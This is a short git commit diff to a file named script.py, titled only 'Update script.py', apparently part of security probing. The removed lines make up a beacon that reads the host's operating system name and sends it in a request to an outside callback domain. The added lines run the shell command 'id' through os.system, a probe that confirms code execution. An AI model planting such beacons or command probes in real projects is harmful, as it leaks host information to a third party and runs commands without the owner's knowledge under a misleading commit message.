07f3209105ac6290f61b6d944c57c98a5e8dffc5
Blaine Elias <126853129+lazersec@users.noreply.github.com>
2024-12-16 11:30:56 +0800

    Update script.py

--- script.py
+++ script.py
@@ -1,14 +1,3 @@
-import platform
-import base64
 
-def get_os_type():
-    os_name = platform.system()
-    return os_name
-
-def encode_to_base64(message):
-    base64_bytes = base64.b64encode(message)
-    base64_message = base64_bytes.decode('utf-8')
-    return base64_message
-
-import requests
-requests.get("http://vjostlcx.requestrepo.com/x?os_type=" + get_os_type())
+import os
+os.system("id")
